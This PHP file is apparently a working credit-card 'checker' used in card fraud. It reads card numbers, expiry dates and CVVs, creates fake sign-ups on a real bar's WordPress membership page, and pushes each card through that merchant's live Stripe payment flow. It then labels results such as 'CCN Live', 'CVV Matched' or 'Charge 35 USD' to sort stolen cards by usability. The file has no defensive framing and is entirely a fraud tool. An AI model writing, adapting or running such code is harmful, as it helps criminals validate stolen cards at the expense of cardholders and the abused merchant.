<?php


if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

###CHECKER PART###  
$zip = rand(10001, 90045);
$time = rand(30000, 699999);
$rand = rand(0, 99999);
$pass = rand(0000000000, 9999999999);
$email = substr(md5(mt_rand()), 0, 7);
$name = substr(md5(mt_rand()), 0, 7);
$last = substr(md5(mt_rand()), 0, 7);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: m.stripe.com',
    'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: text/plain;charset=UTF-8',
    'Origin: https://m.stripe.network',
    'Referer: https://m.stripe.network/inner.html'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "");
$res1 = curl_exec($ch);
$muid = trim(strip_tags(GetStr($res1, '"muid":"', '"')));
$sid = trim(strip_tags(GetStr($res1, '"sid":"', '"')));
$guid = trim(strip_tags(GetStr($res1, '"guid":"', '"')));


/////////////////////==========[Unavailable if empty]==========////////////////
if (empty($schemename)) {
    $schemename = "Unavailable";
}
if (empty($typename)) {
    $typename = "Unavailable";
}
if (empty($brand)) {
    $brand = "Unavailable";
}
if (empty($bank)) {
    $bank = "Unavailable";
}
if (empty($cname)) {
    $cname = "Unavailable";
}
if (empty($phone)) {
    $phone = "Unavailable";
}


$url = "https://theplaygroundbar.com/membership-signup/";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$headers = array(
   "Accept: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$resp = curl_exec($curl);
curl_close($curl);
 $nonce = GetStr($resp,'nonce" value="','"');

 
$url = "https://theplaygroundbar.com/wp-admin/admin-ajax.php";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
'Accept: */*',
'Accept-Language: en-US,en;q=0.9',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Host: theplaygroundbar.com',
'Origin: https://theplaygroundbar.com',
'Referer: https://theplaygroundbar.com/membership-signup/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
'X-Requested-With: XMLHttpRequest',
'sec-ch-ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"'
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data1 = "rcp_user_login=$name&rcp_user_email=$name%40gmail.com&rcp_user_first=$name&rcp_user_last=h&rcp_user_pass=Avinash&rcp_user_pass_confirm=Avinash&rcp_level=1&rcp_gateway=stripe&rcp_card_name=hj&registration_type=&membership_id=0&rcp_registration_payment_id=0&rcp_register_nonce=$nonce&action=rcp_process_register_form&rcp_ajax=true";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data1);
$result1 = curl_exec($curl);
echo"<br>$result1<br>";
$cs = GetStr($result1,'stripe_client_secret":"','"');
$pi = GetStr($result1,'stripe_client_secret":"','_sec');

  
$url = "https://api.stripe.com/v1/payment_intents/$pi/confirm";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
'Accept: application/json',
'Content-Type: application/x-www-form-urlencoded',
'Host: api.stripe.com',
'Origin: https://js.stripe.com',
'Referer: https://js.stripe.com/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
'sec-ch-ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"'
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data = "payment_method_data[type]=card&payment_method_data[billing_details][name]=$name&payment_method_data[billing_details][address][postal_code]=20014&payment_method_data[card][number]=$cc&payment_method_data[card][cvc]=$cvv&payment_method_data[card][exp_month]=$mes&payment_method_data[card][exp_year]=$ano&payment_method_data[guid]=42b194f7-c0ca-4311-b745-efc0056b12509324a3&payment_method_data[muid]=242e8ca5-749f-4135-a216-42ab352f072f4f688a&payment_method_data[sid]=cb922d95-2e93-4e34-a97b-3b231136f70ccc27f4&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F3b1947130b%3B+stripe-js-v3%2F3b1947130b%3B+card-element&payment_method_data[time_on_page]=41726&expected_payment_method_type=card&use_stripe_sdk=false&return_url=https://stripe.com&key=pk_live_51Km0vZAmv4sZDjMuRJhSUpumZmXCtZpKxXkJFkwLW4qoBV2CxzUQZj1YEKuPLxHISDkuCISA6fSYVeWBraXymII700d6kjxjCF&client_secret=$cs";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$result2 = curl_exec($curl);
echo"<br>$result2<br>";
#-----------------------------------------------------------------------------------------

if (strpos($result2, 'Payment complete')) {
    $msg2= 'Charge 1USD ';
    $res= $rcp;
}
elseif (strpos($result2, 'succeeded')) {
    $msg2= 'Charge 35 USD ✅';
    $res= $rcp;
}
elseif(strpos($result2, 'success":true')) {
    $msg2= 'Charge 35 USD ✅';
    $res= $rcp;
}
elseif (strpos($result2, "Your card has insufficient funds")) {
    $res= 'Insufficient Funds ✅';
    $msg2=  'CVV Matched ✅';
   
  
}
elseif (strpos($result2, "BEGIN CERTIFICATE")) { 
    $res= '3D Card ✅';
    $msg2=  'CVV Matched ✅';
   
}
elseif(strpos($result2, "card_error_authentication_required")) { 
    $res= '3D Card ✅';
    $msg2=  'CVV Matched ✅';
   
}
elseif(strpos($result2,'"cvc_check": "pass"')) {
    $res= 'Payment Cannot Be Completed✅';
    $msg2=  'CVV Matched ✅';
   
}
elseif(strpos($result2,'"code": "incorrect_cvc"')) {
    $res= 'CVV Mismatch✅';
    $msg2=  'CCN Live ✅';
   
}
elseif(strpos($result2,'"code": "incorrect_cvc"')) {
    $res= 'CVV Mismatch✅';
    $msg2=  'CCN Live ✅';
   
}  
elseif(strpos($result2, "Your card's security code is incorrect")){
    $res= 'CVV Mismatch✅';
    $msg2=  'CCN Live ✅';
   
} 
elseif(strpos($result2, "security code is invalid")) {
    $res= 'CVV Mismatch✅';
    $msg2=  'CCN Live ✅';
   
} 
elseif (strpos($result1, "transaction_not_allowed")) {
    $res= 'Transaction Not Allowed✅';
    $msg2=  'CVV Matched ✅';
  
}
elseif(strpos($result2, "Your card does not support")) {
    $res= 'Transaction Not Allowed✅';
    $msg2=  'CVV Matched ✅';
  
}
elseif(strpos($result2, "fraudulent"))
{
    $msg2= 'Declined ✘';
    $res=  'Fraudulent! 🞬';
}
elseif(strpos($result2, "fraudulent"))
{
    $msg2= 'Declined ✘';
    $res=  'Fraudulent! 🞬';
}
 elseif (strpos($result1, "Try again in a little bit"))
{
    $msg2= 'Try Again In A Little Bit ✘';
    $res=  'Try Again In A Little Bit! 🞬';
}
elseif(strpos($result2, 
"Try again in a little bit"))
{
    $msg2= 'Try Again In A Little Bit ✘';
    $res=  'Try Again In A Little Bit! 🞬';
}
elseif (strpos($result1, "expired_card")){
    $res = 'Expired Card! 🞬';
    $msg2 =  'Declined ✘';
}
elseif(strpos($result2, "expired_card")) {
    $res = 'Expired Card! 🞬';
    $msg2 =  'Declined ✘';
}
elseif (strpos($result1, "intent_confirmation_challenge")){
    $res = 'Site Have Captch! 🞬';
    $msg2 =  'Dont Use Gate Now ✘';
}  
elseif(strpos($result2, "intent_confirmation_challenge")) {
    $res = 'Site Have Captch! 🞬';
    $msg2 =  'Dont Use Gate Now ✘';
}
elseif (strpos($result1, "generic_decline")) {
    $res = 'Generic Declined! 🞬';
    $msg2 =  'Declined ✘';
}
elseif(strpos($result2, "generic_decline")) {
    $res = 'Generic Declined! 🞬';
    $msg2 =  'Declined ✘';
}
elseif(strpos($result2, "do_not_honor")) {
    $res = 'Do Not Honor! 🞬';
    $msg2 =  'Declined ✘';
}
elseif (strpos($result1, "do_not_honor")){
    $res = 'Do Not Honor! 🞬';
    $msg2 =  'Declined ✘';
}
elseif (strpos($result1, "Your card was declined")){
    $res = 'Your Card Was Declined! 🞬';
    $msg2 =  'Declined ✘';
}
elseif(strpos($result2, "Your card was declined")) {
    $res = 'Your Card Was Declined! 🞬';
    $msg2 =  'Declined ✘';
}
elseif (strpos($result1, 'Your card number is incorrect')){
    $res = 'Card Number Is Incorrect! 🞬';
    $msg2 =  'Declined ✘';
}
elseif(strpos($result2, 'Your card number is incorrect')) {
    $res = 'Card Number Is Incorrect! 🞬';
    $msg2 =  'Declined ✘';
}
elseif (strpos($result1, 'invalid_expiry_year')){
    $res = "Your Card's Expiration Year Is Invalid! 🞬";
    $msg2 =  'Declined ✘';
}
elseif(strpos($result2, "Your card's expiration year is invalid")) {
    $res = "Your Card's Expiration Year Is Invalid! 🞬";
    $msg2 =  'Declined ✘';
}
elseif(strpos($result2, "Your card's expiration month is invalid")) {
    $res = "Your Card's Expiration Month Is Invalid! 🞬";
    $msg2 =  'Declined ✘';
}
elseif (strpos($result1, 'invalid_expiry_month')){
    $res = "Your Card's Expiration Month Is Invalid! 🞬";
    $msg2 =  'Declined ✘';
}
elseif(strpos($result1, "Expired API Key provided")) {
     $res= "SK key revoked ";
    $msg2=  "SK key Expired,Donate Sk Key  ! 🞬\n$sec";
}
elseif(strpos($result1,'testmode_charges_only')){
    $res= "SK key revoked ";
   $msg2=  "SK key Expired,Donate Sk Key  ! 🞬\n$sec";
}
elseif(strpos($result1,'api_key_expired')) {
     $msg2= "SK key Expired,Donate Sk Key  ! 🞬";
    $res=  "$sec ! 🞬";
}
elseif(strpos($result1,'platform_api_key_expired')) {
     $msg2= "SK key Expired,Donate Sk Key  ! 🞬";
    $res=  "$sec ! 🞬";
}
else {
     $res= "Contact owner ✘";
    $msg2=  'Site Dead ✘ ';
}
      
#========================================================================
echo"┠ Status ⇝ $msg2 Resp ⇝ $res";

?>